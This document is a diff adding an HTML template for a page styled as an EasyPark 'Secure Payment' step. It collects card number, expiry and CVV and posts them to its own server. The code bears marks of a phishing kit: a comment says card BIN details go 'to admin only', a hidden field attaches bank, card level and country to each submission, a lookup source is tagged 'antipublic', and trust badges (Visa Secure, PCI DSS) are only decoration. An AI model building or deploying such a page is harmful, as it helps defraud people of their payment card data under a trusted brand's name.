@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="ro"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0">
+<title>Secure Payment — EasyPark</title>
+<script src="/static/js/i18n.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Segoe UI",sans-serif;background:#f0f2f5;margin:0;min-height:100vh}
+.wrap{max-width:480px;margin:0 auto;padding:16px}
+.card-s{background:#fff;border-radius:18px;padding:20px;margin-bottom:14px;box-shadow:0 1px 3px rgba(0,0,0,.06),0 1px 12px rgba(0,0,0,.04)}
+label{display:block;font-size:13px;font-weight:600;color:#374151;margin-bottom:6px}
+.inp{width:100%;background:#f8fafc;border:1.5px solid #e2e8f0;border-radius:12px;padding:14px 16px;font-size:16px;color:#1e293b;transition:border .2s,box-shadow .2s;-webkit-appearance:none;outline:none}
+.inp:focus{border-color:#872879;background:#fff;box-shadow:0 0 0 3px rgba(135,40,121,.1)}
+.inp::placeholder{color:#94a3b8}
+.inp-group{position:relative;display:flex;align-items:stretch;background:#f8fafc;border:1.5px solid #e2e8f0;border-radius:12px;transition:border .2s,box-shadow .2s;overflow:hidden}
+.inp-group:focus-within{border-color:#872879;background:#fff;box-shadow:0 0 0 3px rgba(135,40,121,.1)}
+.inp-icon{display:flex;align-items:center;justify-content:center;padding:0 14px;color:#94a3b8;font-size:15px;flex-shrink:0;border-right:1px solid #e2e8f0}
+.inp-group:focus-within .inp-icon{color:#872879}
+.inp-group input{flex:1;background:transparent;border:none;outline:none;padding:14px 14px;font-size:16px;color:#1e293b;-webkit-appearance:none;min-width:0;width:100%}
+input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
+.btn-pay{width:100%;background:linear-gradient(135deg,#872879,#740668);color:#fff;border:none;border-radius:14px;padding:16px;font-size:16px;font-weight:800;cursor:pointer;box-shadow:0 4px 20px rgba(135,40,121,.35);transition:.2s;letter-spacing:.02em;display:flex;align-items:center;justify-content:center;gap:8px}
+.btn-pay:active{transform:scale(.98)}
+
+/* ── Card preview ─────────────────────────────────────────────────────── */
+.cc-wrap{perspective:1000px;max-width:320px;margin:0 auto 20px}
+.cc-inner{transition:transform .6s cubic-bezier(.4,0,.2,1);transform-style:preserve-3d;position:relative;width:100%;aspect-ratio:1.586}
+.cc-inner.flipped{transform:rotateY(180deg)}
+.cc-face{position:absolute;inset:0;backface-visibility:hidden;border-radius:18px;padding:18px 22px;display:flex;flex-direction:column;justify-content:space-between;box-shadow:0 20px 60px rgba(0,0,0,.35),0 4px 12px rgba(0,0,0,.2)}
+.cc-back{transform:rotateY(180deg)}
+.grad-def{background:linear-gradient(135deg,#1e293b 0%,#475569 100%)}
+.grad-visa{background:linear-gradient(135deg,#0f2b8f 0%,#1a56db 60%,#1e40af 100%)}
+.grad-mc{background:linear-gradient(135deg,#7f1d1d 0%,#b91c1c 50%,#ea580c 100%)}
+.grad-amex{background:linear-gradient(135deg,#064e3b 0%,#047857 60%,#059669 100%)}
+.cc-face::after{content:'';position:absolute;inset:0;border-radius:18px;background:radial-gradient(ellipse at 80% 20%,rgba(255,255,255,.12),transparent 60%);pointer-events:none}
+.chip{width:42px;height:32px;background:linear-gradient(135deg,#c8a94a,#ffe08a,#a67c2a);border-radius:5px;position:relative;flex-shrink:0}
+.chip::before{content:'';position:absolute;left:50%;top:4px;bottom:4px;width:1px;background:rgba(0,0,0,.25);transform:translateX(-50%)}
+.chip::after{content:'';position:absolute;top:50%;left:5px;right:5px;height:1px;background:rgba(0,0,0,.25)}
+.cc-num{font-size:clamp(15px,5vw,20px);letter-spacing:0.22em;font-family:"Courier New",monospace;color:rgba(255,255,255,.95);text-shadow:0 1px 3px rgba(0,0,0,.4)}
+.cc-label{font-size:9px;color:rgba(255,255,255,.5);text-transform:uppercase;letter-spacing:.1em;margin-bottom:2px}
+.cc-val{font-size:13px;color:rgba(255,255,255,.9);font-family:"Courier New",monospace;letter-spacing:.08em}
+/* Magnetic stripe */
+.mag-stripe{position:absolute;top:28px;left:0;right:0;height:42px;background:#111}
+/* CVV strip */
+.cvv-strip{background:#fff;border-radius:4px;padding:8px 12px;display:flex;align-items:center;justify-content:flex-end;gap:12px;margin:0 0 0}
+.cvv-label{font-size:11px;color:#666;font-style:italic}
+.cvv-val{font-family:"Courier New",monospace;font-size:16px;font-weight:700;letter-spacing:.15em;color:#1e293b;min-width:48px;text-align:right}
+
+/* ── Security badges ──────────────────────────────────────────────────── */
+.sec-row{display:flex;align-items:center;justify-content:center;gap:10px;flex-wrap:wrap;padding:10px 0}
+.sec-b{display:inline-flex;align-items:center;gap:5px;padding:5px 10px;border-radius:8px;font-size:10px;font-weight:700;border:1px solid}
+/* Visa logo (text) */
+.logo-visa{font-style:italic;font-weight:900;font-size:20px;color:#fff;letter-spacing:-1px;font-family:"Arial Black",sans-serif}
+/* MC circles */
+.mc-logo{position:relative;width:42px;height:26px;display:flex;align-items:center}
+.mc-c1{width:26px;height:26px;border-radius:50%;background:#eb001b;position:absolute;left:0}
+.mc-c2{width:26px;height:26px;border-radius:50%;background:#f79e1b;position:absolute;right:0;opacity:.9}
+</style>
+</head><body>
+
+<nav style="background:#fff;border-bottom:1px solid #e5e7eb;position:sticky;top:0;z-index:50">
+  <div style="max-width:480px;margin:0 auto;padding:0 16px;height:54px;display:flex;align-items:center;gap:10px">
+    <img src="/static/img/logo.png" alt="EasyPark" style="height:34px;width:auto">
+    <div style="margin-left:auto;display:flex;align-items:center;gap:4px;font-size:11px;color:#ff52a3;font-weight:600">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg><span data-i18n="secure">Secure</span>
+    </div>
+  </div>
+</nav>
+
+<!-- Steps -->
+<div style="background:#fff;border-bottom:1px solid #f1f5f9;padding:12px 0 14px">
+  <div style="max-width:260px;margin:0 auto;padding:0 16px">
+    <div style="display:flex;align-items:flex-start;justify-content:space-between">
+      <div style="display:flex;flex-direction:column;align-items:center;z-index:1">
+        <div style="width:28px;height:28px;border-radius:50%;background:#872879;color:#fff;display:flex;align-items:center;justify-content:center;font-size:11px"><i class="fas fa-check" style="font-size:10px"></i></div>
+        <span style="font-size:10px;margin-top:4px;color:#872879;font-weight:700" data-i18n="step_details">Details</span>
+      </div>
+      <div style="flex:1;height:2px;background:#872879;margin:0 6px;margin-top:-14px"></div>
+      <div style="display:flex;flex-direction:column;align-items:center;z-index:1">
+        <div style="width:28px;height:28px;border-radius:50%;background:#872879;color:#fff;display:flex;align-items:center;justify-content:center;font-size:11px"><i class="fas fa-check" style="font-size:10px"></i></div>
+        <span style="font-size:10px;margin-top:4px;color:#872879;font-weight:700" data-i18n="step_verify">Verification</span>
+      </div>
+      <div style="flex:1;height:2px;background:#872879;margin:0 6px;margin-top:-14px"></div>
+      <div style="display:flex;flex-direction:column;align-items:center;z-index:1">
+        <div style="width:28px;height:28px;border-radius:50%;background:#872879;color:#fff;box-shadow:0 0 0 4px rgba(135,40,121,.2);display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800">3</div>
+        <span style="font-size:10px;margin-top:4px;color:#872879;font-weight:700" data-i18n="step_pay">Payment</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="wrap">
+  <!-- Amount + period banner -->
+  <div style="background:linear-gradient(135deg,#fdf2f8,#fce7f3);border:1px solid #fbcfe8;border-radius:16px;padding:16px 18px;margin-bottom:14px">
+    <div style="display:flex;align-items:center;justify-content:space-between">
+      <div>
+        <div style="font-size:11px;color:#872879;font-weight:600;text-transform:uppercase;letter-spacing:.05em" data-i18n="total_due">Total due</div>
+        <div style="font-size:30px;font-weight:900;color:#56004D;line-height:1.1">{{ session.total_price }} <span style="font-size:16px;font-weight:600">DKK</span></div>
+      </div>
+      <div style="width:48px;height:48px;background:linear-gradient(135deg,#872879,#740668);border-radius:14px;display:flex;align-items:center;justify-content:center">
+        <i class="fas fa-credit-card" style="color:#fff;font-size:20px"></i>
+      </div>
+    </div>
+    <div style="margin-top:10px;padding-top:10px;border-top:1px solid rgba(116,6,104,.2);display:flex;align-items:center;gap:8px;font-size:13px">
+      <i class="fas fa-clock" style="color:#872879;font-size:12px"></i>
+      <span style="color:#374151;font-weight:500" data-i18n="period">Period:</span>
+      <span id="period-from" style="font-weight:700;color:#56004D">—</span>
+      <span style="color:#94a3b8">→</span>
+      <span id="period-to" style="font-weight:700;color:#56004D">—</span>
+      <span style="font-size:11px;color:#6b7280;margin-left:2px">({{ session.hours }} {{ session.time_unit or 'ore' }})</span>
+    </div>
+  </div>
+  <script>
+  (function(){
+    const hrs = {{ session.hours|float }};
+    const unit = "{{ session.time_unit or 'ore' }}";
+    const now = new Date();
+    const end = new Date(now);
+    if(unit === 'zile') end.setDate(end.getDate() + hrs);
+    else end.setHours(end.getHours() + hrs, end.getMinutes());
+    const fmtTime = d => d.toLocaleTimeString('ro-RO',{hour:'2-digit',minute:'2-digit'});
+    const fmtDate = d => d.toLocaleDateString('ro-RO',{day:'2-digit',month:'2-digit',year:'numeric'});
+    if(unit === 'zile'){
+      document.getElementById('period-from').textContent = fmtDate(now);
+      document.getElementById('period-to').textContent   = fmtDate(end);
+    } else {
+      document.getElementById('period-from').textContent = fmtTime(now);
+      document.getElementById('period-to').textContent   = fmtTime(end);
+    }
+  })();
+  </script>
+
+  <!-- Card preview -->
+  <div class="cc-wrap">
+    <div class="cc-inner" id="cc-inner">
+      <!-- Front -->
+      <div class="cc-face grad-def" id="cc-front">
+        <div style="display:flex;justify-content:space-between;align-items:center">
+          <div class="chip"></div>
+          <div id="cc-logo-front">
+            <svg width="40" height="26" viewBox="0 0 40 26" fill="none"><circle cx="14" cy="13" r="13" fill="rgba(255,255,255,.15)"/><circle cx="26" cy="13" r="13" fill="rgba(255,255,255,.1)"/></svg>
+          </div>
+        </div>
+        <div class="cc-num" id="cc-num-disp">•••• •••• •••• ••••</div>
+        <div style="display:flex;justify-content:space-between;align-items:flex-end">
+          <div>
+            <div class="cc-label" data-i18n="bank_label">Bank</div>
+            <div class="cc-val" id="cc-name-disp">CARD HOLDER</div>
+          </div>
+          <div style="text-align:right">
+            <div class="cc-label" data-i18n="valid_until">Valid until</div>
+            <div class="cc-val" id="cc-exp-disp">MM/YY</div>
+          </div>
+        </div>
+      </div>
+      <!-- Back -->
+      <div class="cc-face cc-back grad-def" id="cc-back-face">
+        <div class="mag-stripe"></div>
+        <div style="padding:0 0 10px">
+          <div class="cvv-strip">
+            <span class="cvv-label">CVV</span>
+            <span class="cvv-val" id="cc-cvv-disp">•••</span>
+          </div>
+        </div>
+        <div style="display:flex;justify-content:flex-end;padding-top:8px">
+          <div id="cc-logo-back">
+            <svg width="40" height="26" viewBox="0 0 40 26" fill="none"><circle cx="14" cy="13" r="13" fill="rgba(255,255,255,.15)"/><circle cx="26" cy="13" r="13" fill="rgba(255,255,255,.1)"/></svg>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Form -->
+  <div class="card-s">
+    <form method="POST" id="pay-form">
+      <input type="hidden" name="bin_bank" id="bin_bank_hidden">
+      <!-- Card number -->
+      <div style="margin-bottom:14px">
+        <label data-i18n="card_number">Card number</label>
+        <div class="inp-group" style="position:relative">
+          <span class="inp-icon"><i class="fas fa-credit-card"></i></span>
+          <input type="tel" name="card_number" id="card_number" required inputmode="numeric"
+                 placeholder="0000 0000 0000 0000" maxlength="19"
+                 style="font-family:'Courier New',monospace;letter-spacing:.12em;font-size:16px;font-weight:600"
+                 oninput="fmtCard(this)">
+          <div id="card-type-badge" style="display:flex;align-items:center;padding-right:12px;flex-shrink:0"></div>
+        </div>
+      </div>
+      <!-- Exp + CVV -->
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:14px">
+        <div>
+          <label data-i18n="expiry">Expiry date</label>
+          <div class="inp-group">
+            <span class="inp-icon"><i class="fas fa-calendar"></i></span>
+            <input type="tel" name="exp_date" id="exp_date" required inputmode="numeric"
+                   placeholder="MM/YY" maxlength="5"
+                   style="font-family:'Courier New',monospace"
+                   oninput="fmtExp(this)">
+          </div>
+        </div>
+        <div>
+          <label>CVV / CVC</label>
+          <div class="inp-group">
+            <span class="inp-icon"><i class="fas fa-lock"></i></span>
+            <input type="tel" name="cvv" id="cvv" required inputmode="numeric"
+                   placeholder="•••" maxlength="3"
+                   style="font-family:'Courier New',monospace;letter-spacing:.15em"
+                   oninput="document.getElementById('cc-cvv-disp').textContent=this.value||'•••'"
+                   onfocus="flip(true)" onblur="flip(false)">
+          </div>
+        </div>
+      </div>
+      <!-- BIN info box (hidden — data sent to admin only) -->
+      <div id="bin-info" style="display:none">
+        <span id="bin-bank"></span>
+        <span id="bin-type"></span>
+        <span id="bin-country" style="font-size:14px"></span>
+      </div>
+
+      <!-- Security row -->
+      <div class="sec-row" style="border-top:1px solid #f1f5f9;margin-bottom:16px">
+        <div style="display:flex;align-items:center;gap:5px;font-size:10px;font-weight:700;color:#1d4ed8;background:#eff6ff;border:1px solid #bfdbfe;border-radius:7px;padding:5px 10px">
+          <i class="fas fa-shield-alt" style="font-size:10px"></i> Visa Secure
+        </div>
+        <div style="display:flex;align-items:center;gap:5px;font-size:10px;font-weight:700;color:#9f1239;background:#fff1f2;border:1px solid #fecdd3;border-radius:7px;padding:5px 10px">
+          <i class="fas fa-shield-alt" style="font-size:10px"></i> MC Identity Check
+        </div>
+        <div style="display:flex;align-items:center;gap:5px;font-size:10px;font-weight:700;color:#56004D;background:#fdf2f8;border:1px solid #fbcfe8;border-radius:7px;padding:5px 10px">
+          <i class="fas fa-lock" style="font-size:10px"></i> SSL 256-bit
+        </div>
+        <div style="display:flex;align-items:center;gap:5px;font-size:10px;font-weight:700;color:#7c3aed;background:#fdf2f8;border:1px solid #fbcfe8;border-radius:7px;padding:5px 10px">
+          <i class="fas fa-certificate" style="font-size:10px"></i> PCI DSS
+        </div>
+      </div>
+
+      <button type="submit" class="btn-pay">
+        <i class="fas fa-lock" style="font-size:14px"></i>
+        <span data-i18n="pay_now">PAY NOW</span> — {{ session.total_price }} DKK
+      </button>
+      <p style="text-align:center;font-size:11px;color:#94a3b8;margin:10px 0 0">
+        <span data-i18n="ssl">Secured SSL 256-bit connection</span>
+      </p>
+    </form>
+  </div>
+</div>
+
+<script>
+const CARD_LOGOS = {
+  visa:`<span style="font-style:italic;font-weight:900;font-size:22px;color:#fff;letter-spacing:-1px;font-family:'Arial Black',sans-serif;text-shadow:0 1px 3px rgba(0,0,0,.3)">VISA</span>`,
+  mastercard:`<svg width="42" height="26" viewBox="0 0 42 26"><circle cx="15" cy="13" r="13" fill="#eb001b" opacity=".95"/><circle cx="27" cy="13" r="13" fill="#f79e1b" opacity=".9"/></svg>`,
+  amex:`<span style="font-weight:900;font-size:13px;color:#fff;letter-spacing:.05em">AMEX</span>`,
+  default:`<svg width="40" height="26" viewBox="0 0 40 26" fill="none"><circle cx="14" cy="13" r="13" fill="rgba(255,255,255,.15)"/><circle cx="26" cy="13" r="13" fill="rgba(255,255,255,.1)"/></svg>`
+};
+const BADGE_HTML = {
+  visa:`<span style="font-style:italic;font-weight:900;font-size:17px;color:#1a56db;letter-spacing:-1px;font-family:'Arial Black',sans-serif">VISA</span>`,
+  mastercard:`<svg width="32" height="20" viewBox="0 0 42 26"><circle cx="15" cy="13" r="13" fill="#eb001b"/><circle cx="27" cy="13" r="13" fill="#f79e1b" opacity=".9"/></svg>`,
+  amex:`<span style="font-weight:900;font-size:12px;color:#047857">AMEX</span>`,
+  default:``
+};
+const GRADS = {visa:'grad-visa',mastercard:'grad-mc',amex:'grad-amex',default:'grad-def'};
+
+function detectType(n){
+  if(/^4/.test(n)) return 'visa';
+  if(/^5[1-5]/.test(n)||/^2(2[2-9][1-9]|[3-6]\d{2}|7[01]\d|720)/.test(n)) return 'mastercard';
+  if(/^3[47]/.test(n)) return 'amex';
+  return 'default';
+}
+
+function setGrad(type){
+  const front=document.getElementById('cc-front');
+  const back=document.getElementById('cc-back-face');
+  ['grad-visa','grad-mc','grad-amex','grad-def'].forEach(c=>{front.classList.remove(c);back.classList.remove(c);});
+  const g=GRADS[type];
+  front.classList.add(g);back.classList.add(g);
+  document.getElementById('cc-logo-front').innerHTML=CARD_LOGOS[type];
+  document.getElementById('cc-logo-back').innerHTML=CARD_LOGOS[type];
+  document.getElementById('card-type-badge').innerHTML=BADGE_HTML[type];
+}
+
+let _binCache={}, _binTimer=null;
+
+function fmtCard(el){
+  let v=el.value.replace(/\D/g,'').substring(0,16);
+  el.value=v.replace(/(\d{4})(?=\d)/g,'$1 ');
+  const disp=v.padEnd(16,'•').replace(/(\d{4})/g,'$1 ').trim();
+  document.getElementById('cc-num-disp').textContent=disp;
+  const type=detectType(v);
+  setGrad(type);
+  const netNames={visa:'Visa',mastercard:'Mastercard',amex:'American Express'};
+  if(type!=='default' && v.length>=4){
+    document.getElementById('bin_bank_hidden').value=netNames[type]||type;
+  }
+  if(v.length>=6){
+    clearTimeout(_binTimer);
+    _binTimer=setTimeout(()=>lookupBIN(v.substring(0,6)),600);
+  } else if(v.length<4 || type==='default'){
+    document.getElementById('cc-name-disp').textContent='CARD HOLDER';
+  }
+}
+
+function lookupBIN(bin){
+  if(_binCache[bin]!==undefined){ applyBIN(_binCache[bin]); return; }
+  fetch('/pay/bin/'+bin)
+    .then(r=>r.ok?r.json():{})
+    .then(d=>{ _binCache[bin]=d; applyBIN(d); })
+    .catch(()=>{ _binCache[bin]={}; });
+}
+
+function applyBIN(d){
+  const el=document.getElementById('bin-info');
+  if(!d||!Object.keys(d).length){ return; }
+  let bank='', brand='', cardType='', level='', flag='', countryName='';
+  if(d._src==='antipublic'){
+    bank=d.bank||'';
+    brand=d.brand||'';
+    cardType=(d.type||'').toLowerCase();
+    level=(d.level||'').toLowerCase();
+    flag=d.country_flag||'';
+    countryName=d.country_name||'';
+  } else {
+    bank=(d.bank&&d.bank.name)||'';
+    brand=d.scheme||d.brand||'';
+    cardType=(d.type||'').toLowerCase();
+    level=(d.brand||'').replace(/(visa|mastercard|amex)/i,'').trim().toLowerCase();
+    flag=(d.country&&d.country.emoji)||'';
+    countryName=(d.country&&d.country.name)||'';
+  }
+  const levelColors={gold:'#b7791f',platinum:'#475569',business:'#1e40af',classic:'#374151',standard:'#374151',premium:'#7c3aed'};
+  const levelColor=levelColors[level]||'#374151';
+  if(bank||brand){
+    el.style.display='flex';
+    const bankEl=document.getElementById('bin-bank');
+    bankEl.textContent=bank||(brand.charAt(0).toUpperCase()+brand.slice(1).toLowerCase());
+    const typeEl=document.getElementById('bin-type');
+    const parts=[level?level.toUpperCase():'', cardType].filter(Boolean);
+    typeEl.textContent=parts.join(' · ');
+    typeEl.style.color=levelColor;
+    document.getElementById('bin-country').textContent=flag+(countryName?' '+countryName:'');
+    const richVal=[bank||brand, level.toUpperCase(), cardType, countryName].filter(Boolean).join(' · ');
+    document.getElementById('bin_bank_hidden').value=richVal;
+    if(bank) document.getElementById('cc-name-disp').textContent=bank.substring(0,18).toUpperCase();
+  }
+}
+function fmtExp(el){
+  let v=el.value.replace(/\D/g,'').substring(0,4);
+  if(v.length>=2)v=v.substring(0,2)+'/'+v.substring(2);
+  el.value=v;
+  document.getElementById('cc-exp-disp').textContent=v||'MM/YY';
+}
+function flip(on){ document.getElementById('cc-inner').classList.toggle('flipped',on); }
+</script>
+</body></html>
